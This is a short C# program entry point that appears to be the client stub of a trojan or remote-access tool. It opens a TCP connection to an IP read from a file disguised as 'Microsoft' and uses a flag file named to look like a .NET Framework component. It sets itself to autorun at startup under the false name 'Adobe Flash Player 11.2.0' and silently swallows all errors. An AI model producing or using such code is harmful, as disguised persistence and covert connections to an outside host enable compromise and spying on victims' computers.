using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace App
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Sender.TCP.Sender sender = new Sender.TCP.Sender(GetIp());
                Sender.Domain.Domain domain = new Sender.Domain.Domain(sender);
                System.IO.StreamReader streamReader;
                if (System.IO.File.Exists(AppDomain.CurrentDomain.BaseDirectory + @"\Framework 4.6.1"))
                {
                    if ((streamReader = new StreamReader(AppDomain.CurrentDomain.BaseDirectory + @"\Framework 4.6.1")).ReadLine() == "true")
                    {
                        Sender.AutoOn.AutoOn.SetAutorunValue(true, "Adobe Flash Player 11.2.0");
                    }
                }
                else
                {
                    System.IO.File.Create(AppDomain.CurrentDomain.BaseDirectory + @"\Framework 4.6.1");
                }
                domain.Run();
            }
            catch
            {

            }
        }

        private static string GetIp()
        {
            if (!System.IO.File.Exists(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft"))
                System.IO.File.Create(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft").Close();

            using (StreamReader streamReader = new StreamReader(AppDomain.CurrentDomain.BaseDirectory + @"\Microsoft"))
            {
                var i = streamReader.ReadLine();
                return i;
            }
        }
    }
}
